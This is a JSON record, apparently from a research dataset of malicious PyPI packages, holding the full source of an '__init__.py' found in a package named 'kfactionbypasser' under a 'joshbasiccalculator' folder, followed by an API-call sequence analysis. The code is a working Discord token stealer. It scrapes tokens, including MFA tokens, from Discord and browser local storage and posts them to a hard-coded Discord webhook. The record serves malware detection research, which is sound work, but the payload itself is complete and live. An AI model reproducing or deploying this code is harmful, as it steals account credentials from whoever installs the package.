[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import os\nimport re\nimport json\nfrom urllib.request import Request, urlopen\n\n# your webhook URL\nWEBHOOK_URL = 'https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba'\n\nPING_ME = False\n\ndef find_tokens(path):\n    path += '\\\\Local Storage\\\\leveldb'\n\n    tokens = []\n\n    for file_name in os.listdir(path):\n        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n            continue\n\n        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n            for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                for token in re.findall(regex, line):\n                    tokens.append(token)\n    return tokens\n\ndef main():\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n\n    paths = {\n        'Discord': roaming + '\\\\Discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n\n    message = '@everyone' if PING_ME else ''\n\n    for platform, path in paths.items():\n        if not os.path.exists(path):\n            continue\n\n        message += f'\\n**{platform}**\\n```\\n'\n\n        tokens = find_tokens(path)\n\n        if len(tokens) > 0:\n            for token in tokens:\n                message += f'{token}\\n'\n        else:\n            message += 'No tokens found.\\n'\n\n        message += '```'\n\n    headers = {\n        'Content-Type': 'application/json',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n    }\n\n    payload = json.dumps({'content': message})\n\n    try:\n        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)\n        urlopen(req)\n    except:\n        pass\n\nif __name__ == '__main__':\n    main()",
    "pattern_analysis": {
      "api_sequence": [
        "os.listdir",
        "open",
        "os.path.exists",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "json.dumps",
        "str.encode",
        "urllib.request.Request",
        "urllib.request.urlopen"
      ],
      "api_sequence_with_args": [
        "os.listdir(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "json.dumps({'content': message})",
        "payload.encode()",
        "urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers)",
        "urllib.request.urlopen(req)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os\nimport re\nimport json\nfrom urllib.request import Request, urlopen\n\nWEBHOOK_URL = 'https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba'\n\nPING_ME = False\n\ndef find_tokens(path):\n    path += '\\\\Local Storage\\\\leveldb'\n    tokens = []\n    for file_name in os.listdir(path):\n        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n            continue\n        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n            for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                for token in re.findall(regex, line):\n                    tokens.append(token)\n    return tokens\n\ndef main():\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    paths = {\n        'Discord': roaming + '\\\\Discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n    message = '@everyone' if PING_ME else ''\n    for platform, path in paths.items():\n        if not os.path.exists(path):\n            continue\n        message += f'\\n**{platform}**\\n```\\n'\n        tokens = find_tokens(path)\n        if len(tokens) > 0:\n            for token in tokens:\n                message += f'{token}\\n'\n        else:\n            message += 'No tokens found.\\n'\n        message += '```'\n    headers = {\n        'Content-Type': 'application/json',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n    }\n    payload = json.dumps({'content': message})\n    try:\n        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)\n        urlopen(req)\n    except:\n        pass\n\nif __name__ == '__main__':\n    main()"
    }
  },
  {
    "metadata": {
      "package_name": "kfactionbypasser-0.0.1",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/kfactionbypasser-0.0.1/kfactionbypasser-0.0.1/joshbasiccalculator/__init__.py",
      "code_hash": "e35dcfa9a449c92b3c1327ad7563ab2a"
    }
  }
]